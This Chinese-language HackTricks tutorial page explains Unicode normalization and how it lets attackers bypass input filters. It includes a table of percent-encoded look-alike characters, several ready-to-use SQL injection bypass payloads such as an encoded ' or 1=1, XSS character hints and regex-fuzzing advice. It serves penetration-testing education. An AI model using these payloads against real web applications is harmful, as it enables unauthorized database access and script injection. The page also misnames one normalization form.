# Unicode规范化

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 背景

规范化确保两个可能使用不同二进制表示形式的字符串在规范化后具有相同的二进制值。

字符之间有两种总体类型的等价性，“**规范等价**”和“**兼容性等价**”：\
**规范等价**字符在打印或显示时被假定具有相同的外观和含义。**兼容性等价**是一种较弱的等价性，在这种情况下，两个值可能代表相同的抽象字符，但可以以不同的方式显示。**Unicode**标准定义了**4种规范化算法**；**NFC、NFD、NFKD和NFKD**，每种算法以不同的方式应用规范和兼容性规范化技术。您可以在Unicode.org上阅读更多关于不同技术的信息。

### Unicode编码

尽管Unicode部分设计是为了解决互操作性问题，但标准的发展、对旧系统的支持需求以及不同的编码方法仍然可能构成挑战。\
在我们深入研究Unicode攻击之前，以下是关于Unicode的主要了解点：

* 每个字符或符号都映射到一个数值，称为“代码点”。
* 代码点值（因此字符本身）由1个或多个字节在内存中表示。像英语国家使用的LATIN-1字符可以使用1个字节表示。其他语言有更多字符，需要更多字节来表示所有不同的代码点（因为它们不能使用已经被LATIN-1占用的那些）。
* “编码”一词指的是字符以字节序列表示的方法。最常见的编码标准是UTF-8，使用这种编码方案，ASCII字符可以使用1个字节表示，或者最多4个字节表示其他字符。
* 当系统处理数据时，它需要知道使用的编码来将字节流转换为字符。
* 尽管UTF-8是最常见的，但还有类似的编码标准，名为UTF-16和UTF-32，它们之间的区别在于表示每个字符所使用的字节数。例如，UTF-16使用至少2个字节（但最多4个），而UTF-32对所有字符使用4个字节。

Unicode规范化两个不同字节表示相同字符的示例：

![](<../../.gitbook/assets/image (156).png>)

**Unicode等价字符列表可以在这里找到：** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) 和 [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### 发现

如果您在web应用程序中找到一个被回显的值，您可以尝试发送**‘KELVIN符号’ (U+0212A)**，它**规范化为"K"**（您可以将其发送为`%e2%84%aa`）。**如果回显了一个"K"**，那么，某种形式的**Unicode规范化**正在执行。

其他**示例**：`%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` 经过**unicode**后是 `Leonishan`。

## **易受攻击的示例**

### **SQL注入过滤器绕过**

想象一个网页，它使用字符`'`来创建带有用户输入的SQL查询。这个网页作为安全措施，**删除**用户输入中所有出现的字符**`'`**，但在**删除之后**和**创建查询之前**，它使用**Unicode**对用户输入进行**规范化**。

然后，恶意用户可以插入一个不同的Unicode字符等价于`' (0x27)`，如`%ef%bc%87`，当输入被规范化时，会创建一个单引号，出现**SQL注入漏洞**：

![](<../../.gitbook/assets/image (157) (1).png>)

**一些有趣的Unicode字符**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap 模板

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS (跨站脚本攻击)

您可以使用以下字符之一来欺骗 web 应用程序并利用 XSS：

![](<../../.gitbook/assets/image (312) (1).png>)

请注意，例如第一个 Unicode 字符可以发送为：`%e2%89%ae` 或 `%u226e`

![](<../../.gitbook/assets/image (215) (1).png>)

### Fuzzing 正则表达式

当后端**使用正则表达式检查用户输入**时，可能会出现**输入**被**规范化**用于**正则表达式**，但**未**用于其被**使用**的地方。例如，在 Open Redirect 或 SSRF 中，正则表达式可能会**规范化发送的 URL**，但随后**按原样访问它**。

工具 [**recollapse**](https://github.com/0xacb/recollapse) 允许**生成输入的变体**以 fuzz 后端。更多信息请查看 **github** 和这篇 [**文章**](https://0xacb.com/2022/11/21/recollapse/).

## 参考资料

**本页的所有信息取自：** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/#**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)

**其他参考资料：**

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass_WAF_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass_WAF_Unicode.html)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
